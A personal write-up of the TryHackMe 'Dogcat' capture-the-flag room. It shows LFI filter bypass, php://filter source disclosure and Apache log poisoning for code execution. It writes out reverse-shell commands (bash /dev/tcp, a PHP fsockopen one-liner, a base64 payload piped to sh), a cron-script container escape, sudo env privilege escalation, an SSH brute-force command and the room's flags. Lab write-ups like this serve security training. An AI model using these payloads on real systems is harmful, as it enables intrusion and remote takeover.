# Tryhackme.com Room : Dogcat
`https://tryhackme.com/room/dogcat`


# Instance
```
export IP=10.10.172.233
```

# Nmap
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
```

The website contians 2 buttons `dog` & `cat` that control the `view` query parameter
```
/?view=cat
```

When we enter some random string we get the error:
```
Warning: include(catr.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'catr.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

Soo this seems like a straight up include.

When I query `/?view=../../../etc/passwd` I get :
```
Sorry, only dogs or cats are allowed.
```

Simply appending `cat` to the url worked `/?view=../../../etc/passwdcat` so it's just checking if `cat` or `dog` is present in the string. If we can find a folder with `cat` in it, we could traverse path, include this folder, and continue traversing.

Before continuing exploration, let's gobuster the website:
```
/index.php (Status: 200)
/cat.php (Status: 200)
/style.css (Status: 200)
/flag.php (Status: 200)
/cats (Status: 301)
/dogs (Status: 301)
/dog.php (Status: 200)
/server-status (Status: 403)
```

We can use this path `/var/lib/mlocate` which contains `cat` to fool the check.
NOTE that `.php` is appended to the file so we can't include `/etc/passwd`

This works however :
```
/?view=../../../var/lib/mlocate/../../../var/www/html/dog
```

There is a `flag.php` file, let's try that
```
/?view=../../../var/lib/mlocate/../../../var/www/html/flag
```

We don't get any output tho (Same when browsing `/flag.php`)
But we don't see any flags.

Tried to include a remote address (Our own http server) but we get this error
```
Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in /var/www/html/index.php on line 24
```

Which mean we can't do `http` inclusion.

Looking at `PayloadAllThings`.
Tried using null byte at the end `%00`. The error show that it's trying to include the correct path but it fail to include.

We can exfiltrate data by including `php://filter/convert.base64-encode/resource=dog`
This work since it will happend .php to the file path.

Trying with `resource=flag` we get the `Sorry only dogs and cats allowed` so let's do a directory traversal again
```
php://filter/convert.base64-encode/resource=../../../var/lib/mlocate/../../../var/www/html/flag
```

We get this base64 string:
```
PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=
```

Which is decoded to :
```
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```

Soo here we got the first flag
```
THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
```

We can get this using this python code
```py
import requests
import base64

url = "http://10.10.214.81/?view="

base64_php_encode="php://filter/convert.base64-encode/resource="
path = "../../../var/lib/mlocate/../../../var/www/html/flag"

payload = base64_php_encode + path

r = requests.get(url+payload)

encoded_content = r.text.split('Here you go!')[1].split('</')[0].strip().encode('ascii')

decoded = base64.b64decode(encoded_content).decode('utf-8')

print(decoded)
```

Soo.. Now i'm still limited by the `.php` that is appended at the end... Gotta find a way to go around this.

I guess we would like to exfiltrate `/etc/passwd` so we can bruteforce the ssh password ? Not sure how else we can get on the machine.

Hmmm so apparently the query parameter string get truncated at some length (payloadAllThings mentionned 4096 bytes but it seems lower in this case).

I added a bunch of `/.` in the path and i get this error :
```
include(): Failed opening 'php://filter/convert.base64-encode/resource=../../../var/lib/mlocate/../../../var/www/html/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././flag.php
```

The path seem ok but it wont include. if I remove the .php it works (The server automatically append the .php to the string).So it seems that only the string that is shown is truncated, not the string that is passed to the include.

We can dump index.php to see whats happening :
```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

Ohhh well.. Should have done this before, there is a `ext` query param, let's use that.

We can set the query parameters:
```
view = "../../../var/lib/mlocate/../../../etc"
ext = "/passwd"
```

And we get the `/etc/passwd` file :
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Hmm seems like only root can login.. I doubt we can bruteforce the root ssh password... let's try it anyways
```
patator ssh_login host=$IP user=root password=FILE0 0=rockyou.txt -x ignore:mesg='Authentication failed.'
```

Ok so back to the local file inclusion.
Found some method that use the `/var/log/apache2/access.log` file.
To test it, we do a get request to `http://$IP/<?php phpinfo(); ?>`
Than we query the access.log file with `../../../var/lib/mlocate/../../../var/log/apache2/&ext=/access.log`

Unfortunately, the access.log can't be displayed... we get the error :
```
Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 207257808 bytes) in /var/www/html/index.php on line 24
```

We might be able to do it on a clean machine tho ? The access.log would be smaller.

I was able to load it by restarting the machine but my code was not executed (First log was showing fine but when i did the request to `/<?php phpinfo(); ?>` it wouldn't work anymore. We get the error :
```
Parse error: syntax error, unexpected 'GET' (T_STRING) in /var/log/apache2/access.log on line 7
```

Hmmm... this was promising.. we'll look for something else and come back to it if we don't find anything.

There is also the `data` wrapper that can be interesting :
```
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

We have the problem here that `view` must contains `dog` or `cat`. Tried to create a base64 payload that contains one of those by appending random letters in a loop but didn't find an encoded form containng either `dog` or `cat`.
Also, not sure the server will allow `data` wrapper but i can't test it until I pass the check.
There is a mention that wrappers can be chained. Maybe this is the answer ?
Yeah soo, i just tested with `/?view=data://text/plain;dog` and we get :
```
Warning: include(): data:// wrapper is disabled in the server configuration by allow_url_include=0 in /var/www/html/index.php on line 24
```

Sooo.. Not an option..

So i came back to the `access.log` method. I kept seeing the example doing the request directly with `nc` instead of doing a `curl` request.
Not sure why but it worked like a charm when I used `nc`...
Looking at the log, we could probably use the user-agent string to get our execution going.
So yeah, it does work with the user agent as well `curl -v -H "User-Agent: <?php passthru('id'); ?>" "http://$IP/"`. I find it better because you don't have to worry about url encoding characters.

So let's just get a shell :
```
curl -v -H "User-Agent: <?php passthru('bash -c \"bash -i >& /dev/tcp/10.10.193.174/8888 0>&1\"
'); ?>" "http://$IP/"
```
Doesn't work...

Let's try to wget a file
```
curl -v -H "User-Agent: <?php passthru('wget http://10.10.193.174:8000 2>&1'); ?>" "http://$IP/"
```
Wget not found

Let's try nc
```
curl -v -H "User-Agent: <?php passthru('nc 10.10.193.174 8888 2>&1'); ?>" "http://$IP/"
```
nc not found

We could use `php` I guess. But we have trouble with the escaping of `'` and `"`

Also tried putting the php code directly here but again we get problems because some of our `"` are interpreted as `\"`
```
curl -v -H 'User-Agent: <?php $sock=fsockopen("10.10.193.174",8888);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' "http://$IP/"
```

Maybe we could try doing the request with python, might work (using `'''` strings)

Ok sooo... After poking around for way tooo long, I finally found a way to get a reverse shell. (Also, i'm stupid, was using the public ip for my reverse shell.. That's why i wasn't getting any connection....)
I listed all the binaries in the path and found `base64` binary. Then I realised I could base64 encode the payload and run it.

Couldn't make it work with the bash reverse shell syntax, of the other options, seems like only php is available
```
php -r '$sock=fsockopen("10.1.42.150",8888);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Which is encoded to 
```
cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjEuNDIuMTUwIiw4ODg4KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=
```

Then we want to run this on the server :
```
echo cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjEuNDIuMTUwIiw4ODg4KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc= | base64 -d | sh
```

Our request look like this
```py
r = requests.get(url, headers={
        'User-Agent': f"<?php passthru('{shell_cmd}'); ?>"
})
```

We then activate it by showing the access.log file :
```py
r = requests.get(url, params={ 'view':'../../../var/lib/mlocate/../../../var/log/apache2/', 'ext':'/access.log'})
```

Annd we got a shell  !

Running sudo -l we get :
```
User www-data may run the following commands on 4b28a6a6685d:
    (root) NOPASSWD: /usr/bin/env
```

Oh well, gtfobins tell us we can simply run
```
sudo env /bin/sh
```

Andd we are root !
```
uid=0(root) gid=0(root) groups=0(root)
```

Let's find some flag.

Flag 3 is in `/root/flag3.txt`:
```
THM{D1ff3r3nt_3nv1ronments_874112}
```


Running `find / -name flag*` we find 
Flag 2 in `/var/www/flag2_QMW7JvaY2LvK.txt`
```
THM{LF1_t0_RC3_aec3fb}
```

Hmmm, where is the fourth flag ?

Hmmm there is a `opt/backups/backup.tar` file. Let's check it out.

Nopp, seems like it's an actual backup..

Couldn't find anything on the box.. Looked up a writeup.
And the flag is not actually on the box.
Well..it is, the `dogcat` app run inside a container (as we can see from the backup structure and also the `/.dockerenv` file).
Should have realised there was more to it when I changed the root password and i couldn't connect to the box via ssh (Also there was no ssh process running inside the container).
We can modify the `/opt/backups/backup.sh` file to get a reverse shell to the box that host the container

We append the reverse shell to the script
```
echo 'bash -i >& /dev/tcp/10.1.42.150/7777 0>&1' >> /opt/backups/backup.sh
```

We then receive a reverse shell and see the `flag4.txt` file in `/root` of the box :
```
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```

And it's done